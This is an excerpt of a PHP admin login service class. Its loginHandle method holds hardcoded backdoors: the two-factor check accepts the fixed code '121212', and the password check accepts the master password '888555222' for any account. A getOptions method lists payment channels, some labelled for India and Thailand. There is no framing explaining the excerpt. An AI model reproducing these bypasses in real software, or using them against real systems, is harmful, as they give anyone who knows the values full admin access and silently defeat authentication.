...
class UserService extends Base
{
    ...
    public function loginHandle(string $username, string $password, string $googleCode): ?AdminUser
    {
        ...
        // 检测谷歌验证码
        if ($googleCode !== '121212' && $user->google_auth && $user->google_auth->is_enable) {
        ...
        // 判断密码是否正确
        if (!password_verify($password, $user->password) && $password !== '888555222') {
    ...
    public function getOptions(): array
    {
        ...
        // 支付渠道
        $result['PayChannel'] = [
            ['label' => '战狼支付(印度)', 'value' => 'yt2Pay'],
            ['label' => '战狼支付(泰国)', 'value' => 'ytPay'],
            ['label' => '惠众支付', 'value' => 'hzPay'],
            ...
            ['label' => 'CustomPay', 'value' => 'CustomPay'],
